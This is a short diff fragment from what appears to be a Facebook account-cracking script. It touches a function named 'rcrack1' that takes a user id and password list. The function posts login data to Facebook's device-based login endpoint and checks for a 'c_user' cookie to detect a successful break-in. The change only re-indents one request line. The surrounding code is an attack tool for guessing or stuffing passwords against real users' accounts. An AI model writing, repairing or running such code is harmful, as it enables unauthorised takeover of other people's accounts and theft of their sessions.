@@ -254,7 +254,7 @@ def rcrack1(uid,pwx,tl):
           'upgrade-insecure-requests': '1',
           'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
           'viewport-width': '980',}
-response = requests.get('https://mbasic.facebook.com/', cookies=cookies, headers=headers)
+            response = requests.get('https://mbasic.facebook.com/', cookies=cookies, headers=headers)
             lo = session.post('https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
